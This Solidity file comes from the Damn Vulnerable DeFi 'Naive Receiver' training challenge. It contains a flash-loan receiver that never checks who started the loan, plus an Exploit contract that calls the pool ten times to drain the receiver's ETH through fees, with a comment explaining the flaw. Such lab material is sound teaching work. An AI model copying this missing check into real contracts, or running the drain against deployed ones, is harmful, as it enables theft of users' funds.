// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "lib/solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanReceiver is IERC3156FlashBorrower {
    address private pool;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    error UnsupportedCurrency();

    constructor(address _pool) {
        pool = _pool;
    }

    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    )
        external
        returns (bytes32)
    {
        assembly {
            // gas savings
            if iszero(eq(sload(pool.slot), caller())) {
                mstore(0x00, 0x48f5c3ed)
                revert(0x1c, 0x04)
            }
        }

        if (token != ETH) {
            revert UnsupportedCurrency();
        }

        uint256 amountToBeRepaid;
        unchecked {
            amountToBeRepaid = amount + fee;
        }

        _executeActionDuringFlashLoan();

        // Return funds to pool
        SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // Internal function where the funds received would be used
    function _executeActionDuringFlashLoan() internal {}

    // Allow deposits of ETH
    receive() external payable {}
}

contract Exploit {
    function exploit(FlashLoanReceiver receiver, NaiveReceiverLenderPool pool, address eth) public {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, eth, 0, "");
        }
    }
    //In `onFlashLoan` from `FlashLoanReceiver`, the first argument is supposed to be the `initiator` of the flash loan,
    //which will be the address of msg.sender who called `flashLoan` on the pool. However, in `onFlashLoan`, that argument
    //is left out and not checked that the `initiator` is `FlashLoanReceiver`. This means that anyone can call `flashLoan`,
    //pass in the address of `FlashLoanReceiver` as the `receiver`, and this will make `FlashLoanReceiver` transfer ETH to
    //the `pool` contract.
}
